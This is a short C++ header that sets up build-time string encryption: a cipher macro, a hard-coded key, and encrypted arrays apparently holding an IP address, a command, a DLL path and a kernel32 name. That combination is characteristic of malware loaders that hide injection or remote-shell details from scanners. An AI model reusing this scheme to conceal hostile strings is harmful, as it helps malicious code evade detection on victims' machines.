#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (char)((i % 4 | ((i + 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i * BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << i) ^ 162)
std::array<uint8_t, 16> BUILD_TIME_KEY = { 203, 216, 53, 243, 65, 21, 153, 57, 169, 217, 219, 118, 167, 168, 171, 65 };

extern unsigned char str_ip[];
extern unsigned char str_cmd[];
extern unsigned char str_dllPath[];
extern unsigned char str_kernel32[];
